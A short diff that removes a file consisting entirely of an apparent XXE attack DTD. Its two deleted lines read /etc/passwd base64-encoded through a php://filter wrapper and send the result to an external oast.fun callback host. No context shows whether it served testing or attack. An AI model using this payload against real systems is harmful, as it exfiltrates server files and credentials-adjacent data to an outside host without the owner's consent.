@@ -1,2 +1,0 @@
-<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
-<!ENTITY % paran1 "<!ENTITY exfil SYSTEM 'http://bzwqiornxxqsiqveizsnwwjbhmu6vbzjw.oast.fun/?x=%data;'>">
